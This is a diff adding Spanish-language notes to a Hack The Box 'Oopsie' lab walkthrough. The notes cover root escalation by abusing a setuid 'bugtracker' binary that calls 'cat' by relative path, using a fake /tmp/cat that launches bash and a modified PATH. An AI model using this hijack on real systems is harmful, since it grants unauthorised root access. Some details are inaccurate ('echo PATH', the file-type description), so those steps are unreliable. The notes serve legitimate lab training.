@@ -45,6 +45,25 @@ HACK THE BOX - OOPSIE MACHINE
 - id                                                                                                                                        -Al ejecutar nos mostrará la información de identificación del usuario actual. User ID - Group ID - Grupos secundarios, etc.
 
             -De donde encontramos que robert pertenece a un grupo segundario "Bugtracker" [uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)]
+            -Bugtracker es una herramienta que permite a los equipos de desarrollo y control de calidad registrar, organizar y solucionar problemas o errores durante el ciclo de vida del desarrollo de software,"robert" tiene acceso o está asignado al grupo "bugtracker" (con GID 1001), lo que puede darnos acceso.
+
+- ls -l /usr/bin/bugtracker && file /usr/bin/bugtracker                                                                                     -Comando que nos permite listar los permisos del programa bugtracker y file  determina el tipo de archivo, indicando que es un archivo de texto ejecutable en formato ASCII.
+
+            -De la salida podemos ver "-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker" en la la "s" indica que se ha establecido el bit setuid (set-user-ID). El bit setuid indica que cuando se ejecute este archivo, se ejecutará con los privilegios del propietario del archivo, que en este caso es root.Esto permite que el archivo pueda realizar ciertas operaciones o acceder a recursos que normalmente solo estarían disponibles para el propietario o el superusuario.
+
+- /usr/bin/bugtracker                                                                                                                       -Ejecutamos la aplicacion para observar el comportamiento
+
+            -le damos algunos valores, y verificamos que nos da como salida "cat: /root/reports/12, donde 12 es la entrada que le digmos a bug tracker, con lo anterior verificamos que se ejecuta cat pero no nos da una ruta especifica desde donde se ejecute, asi que podremos vulnerar esto para ejecutar bash de la siguiente manera
+
+- cd tmp                                                                                                                                    -Nos dirigimos al directorio tmp   
+- echo "/bin/bash" > cat                                                                                                                    -Generamos un archivo con el nombre cat y el contenido puesto en la linea
+- chmod +x cat                                                                                                                              -Le damos permisos de ejecucion al archivo cat
+- export PATH=/tmp:$PATH                                                                                                                    -Para poder ejecutar agregamos el directorio /tmp a la ruta PATH
+- echo PATH                                                                                                                                 -Verificamos que /tmp se encuentre en los ejecutables de PATH
+- /usr/bin/bugtracker                                                                                                                       -Por ultimo ejecutamos el programa y se ejecutara un bash con los permisos de root
+- su root                                                                                                                                   -Accedemos al usuario root con todos los privilegios y captamos nuestras flags.
+- locate root.txt
+- locate user.txt                                                                                                                                   
+
+            -Ambos archivos de texto contiene nuestros FLAGS.
             
-
-
